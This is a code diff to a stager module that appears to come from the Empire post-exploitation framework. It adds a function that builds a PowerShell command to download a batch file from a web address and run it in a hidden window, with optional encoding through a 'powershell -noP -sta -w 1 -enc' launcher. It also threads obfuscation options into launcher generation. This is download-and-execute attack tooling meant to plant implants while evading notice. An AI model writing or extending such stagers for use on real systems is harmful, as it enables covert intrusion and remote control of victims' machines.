@@ -75,8 +75,16 @@ class Stagers:
                 if stagerOption == option:
                     stager.options[option]['Value'] = str(value)
 
+    def generate_launcher_fetcher(self, language=None, encode=True, webFile='http://127.0.0.1/launcher.bat', launcher='powershell -noP -sta -w 1 -enc '):
+        #TODO add handle for other than powershell language
+        stager = 'wget "' + webFile + '" -outfile "launcher.bat"; Start-Process -FilePath .\launcher.bat -Wait -passthru -WindowStyle Hidden;'
+        if encode:
+            return helpers.powershell_launcher(stager, launcher)
+        else:
+            return stager
 
-    def generate_launcher(self, listenerName, language=None, encode=True, userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', safeChecks='true'):
+
+    def generate_launcher(self, listenerName, language=None, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', safeChecks='true'):
         """
         Abstracted functionality that invokes the generate_launcher() method for a given listener,
         if it exists.
@@ -88,7 +96,7 @@ class Stagers:
 
         activeListener = self.mainMenu.listeners.activeListeners[listenerName]
 
-        launcherCode = self.mainMenu.listeners.loadedListeners[activeListener['moduleName']].generate_launcher(encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries, language=language, listenerName=listenerName, safeChecks=safeChecks)
+        launcherCode = self.mainMenu.listeners.loadedListeners[activeListener['moduleName']].generate_launcher(encode=encode, obfuscate=obfuscate, obfuscationCommand=obfuscationCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries, language=language, listenerName=listenerName, safeChecks=safeChecks)
         
         if launcherCode:
             return launcherCode
